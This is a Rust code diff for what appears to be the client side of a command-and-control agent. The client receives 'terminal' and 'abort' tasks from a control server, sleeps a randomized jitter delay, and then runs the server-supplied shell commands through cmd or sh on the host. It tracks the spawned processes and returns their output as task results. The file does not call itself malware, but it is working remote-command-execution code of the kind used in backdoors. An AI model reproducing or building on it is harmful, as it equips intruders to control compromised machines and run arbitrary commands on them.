@@ -1,54 +1,194 @@
 use std::{
     process::Command,
-    io::Write,
     str,
     thread,
     time,
+    sync::Mutex,
+    io::Read,
 };
+use std::process::{Child, Stdio};
+use lazy_static::lazy_static;
 use rand::Rng;
-use crate::models::TaskResult;
-use crate::Task;
+use crate::models::{
+    Task,
+    TaskResult,
+};
 
 const TERMINAL_CMD: &'static str = "terminal";
+const ABORT_CMD: &'static str = "abort";
+const DEFAULT_MIN_WAIT: u32 = 0;
+const DEFAULT_MAX_WAIT: u32 = 500;
 
-pub fn run_task(task: Task) -> TaskResult {
-    let wait = rand::thread_rng().gen_range(task.min_delay, task.max_delay);
+lazy_static! {
+    static ref RUNNING_TASKS: Mutex<Vec<RunningTask>> = Mutex::new(vec![]);
+}
+
+/// Struct representing ta running task
+struct RunningTask {
+    id: String,
+    child: Child,
+}
+
+/// Methods for the RunningTask struct
+impl RunningTask {
+    /// Checks weather a running task is completed or not
+    ///
+    /// # Returns
+    /// If complete, true, else false
+    pub fn is_complete(&mut self) -> bool {
+        match self.child.try_wait() {
+            Ok(Some(_)) => true,
+            _ => false
+        }
+    }
+
+    /// Get a TaskResult from a running task
+    ///
+    /// # Returns
+    /// If the task is completed, a TaskResult containing output from the task is returned,
+    /// otherwise if the task is not completed, None is returned
+    pub fn get_result(&mut self) -> Option<TaskResult> {
+        let exit_status = match self.child.try_wait() {
+            Ok(Some(val)) => val,
+            _ => return None
+        };
+
+        let option = exit_status.code();
+        let exit_code = match option {
+            Some(val) => val,
+            None => 0
+        };
+        let stdout = self.child.stdout.take();
+        let stderr = self.child.stderr.take();
+        let mut result = String::new();
+        if exit_code == 0 {
+            if let Some(_) = stdout {
+                stdout.unwrap()
+                    .read_to_string(&mut result)
+                    .expect("Failed to read stdout");
+            } else {
+                #[cfg(debug_assertions)]
+                println!("Command had no output!");
+            };
+        } else {
+            if let Some(_) = stderr {
+                stderr.unwrap()
+                    .read_to_string(&mut result)
+                    .expect("Failed to read stderr");
+            } else {
+                #[cfg(debug_assertions)]
+                println!("Command had no output!");
+            };
+        };
+        Some(TaskResult {
+            id: self.id.clone(),
+            status: exit_code,
+            result,
+        })
+    }
+
+    pub fn abort_task(&mut self) {
+        #[cfg(debug_assertions)]
+        println!("Killing task #{}", self.id);
+
+        self.child.kill().expect("Failed to kill task");
+    }
+}
+
+/// Used to check and get the running tasks who are completed
+///
+/// # Returns
+/// Vector containing TaskResult from the completed tasks
+pub fn check_completed() -> Vec<TaskResult> {
+    #[cfg(debug_assertions)]
+    println!("\nChecking completed\n");
+
+    let mut tasks = RUNNING_TASKS.lock().unwrap();
+    let mut removed = 0;
+    let mut complete_tasks: Vec<TaskResult> = vec![];
+
+    for i in 0..tasks.len() {
+        let t = tasks.get_mut(i - removed).unwrap();
+        if t.is_complete() {
+            let tr = t.get_result().unwrap();
+            #[cfg(debug_assertions)] {
+                println!("#{} complete. Resulting output:", t.id);
+                println!("{}", tr.result);
+            }
+            complete_tasks.push(tr);
+
+            tasks.remove(i - removed);
+            removed += 1;
+        } else {
+            #[cfg(debug_assertions)]
+            println!("Task #{} is not complete", t.id);
+        }
+    }
+    complete_tasks
+}
+
+/// Run a task received from the control server
+pub fn run_task(task: Task) {
+    #[cfg(debug_assertions)] {
+        println!("Running {} task #{} ({}-{}ms): {}",
+                 task.name,
+                 task.id,
+                 task.min_delay,
+                 task.max_delay,
+                 task.data);
+    }
+
+    let wait = if task.min_delay < task.max_delay {
+        rand::thread_rng().gen_range(task.min_delay, task.max_delay)
+    } else {
+        rand::thread_rng().gen_range(DEFAULT_MIN_WAIT, DEFAULT_MAX_WAIT)
+    };
+
     thread::sleep(time::Duration::from_millis(wait as u64));
 
     // Add more command types here when supported by server and implemented in client
-    let result = terminal_command(task.id, task.data);
-
-    result
+    match &task.name[..] {
+        TERMINAL_CMD => {
+            let child = terminal_command(task.data);
+            let rt = RunningTask {
+                id: task.id,
+                child,
+            };
+            RUNNING_TASKS.lock()
+                .unwrap()
+                .push(rt);
+        },
+        ABORT_CMD => {
+            abort_tasks();
+        },
+        _ => {}
+    }
 }
 
+/// Aborts all running tasks
+fn abort_tasks() {
+    let mut running_tasks = RUNNING_TASKS.lock().unwrap();
+    for t in running_tasks.iter_mut() {
+        t.abort_task();
+    }
+}
 
 /// Runs a terminal command at the client host
-pub fn terminal_command(id: String, command: String) -> TaskResult {
-    #[cfg(debug_assertions)]
-    println!("Running command: {}", command);
-
-    let output = if cfg!(target_os = "windows") {
+fn terminal_command(command: String) -> Child {
+    if cfg!(target_os = "windows") {
         Command::new("cmd")
             .args(["/C", &command])
-            .output()
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
             .expect("Failed to execute command")
     } else {
         Command::new("sh")
             .arg("-c")
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
             .arg(command)
-            .output()
+            .spawn()
             .expect("Failed to execute command")
-    };
-    #[cfg(debug_assertions)]
-        std::io::stdout().write_all(&output.stdout).unwrap();
-
-    let output_string = match str::from_utf8(&output.stdout) {
-        Ok(val) => val,
-        Err(_) => "Failed parse output command"
-    };
-    TaskResult {
-        id,
-        status: output.status.code().unwrap(),
-        result: String::from(output_string),
     }
 }
